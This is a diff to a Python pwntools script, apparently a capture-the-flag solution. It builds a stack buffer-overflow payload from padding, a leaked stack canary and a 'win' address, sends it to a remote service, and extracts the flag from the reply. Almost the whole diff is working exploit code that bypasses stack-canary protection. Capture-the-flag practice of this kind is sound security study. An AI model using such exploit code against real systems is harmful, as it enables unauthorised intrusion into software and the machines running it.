@@ -35,8 +35,27 @@ def getcanary():
 canary = getcanary()
 print(canary)
 
+padding1 = b'A'*32
+padding2 = b'B'*20
+
+payload = padding1 + canary + padding2 + win
+
 conn = remote(url, port)
 
-conn.interactive()
+print(conn.recv())
+
+print(str(len(payload)).encode())
+conn.sendline(str(len(payload)).encode())
+
+print(conn.recv())
+
+conn.sendline(payload)
+
+reply = conn.recv()
+print(reply)
+
+flag = 'flag'+reply.split(b'flag')[-1].decode()[:-1]
+
+print('\n'+flag)
 
 conn.close()
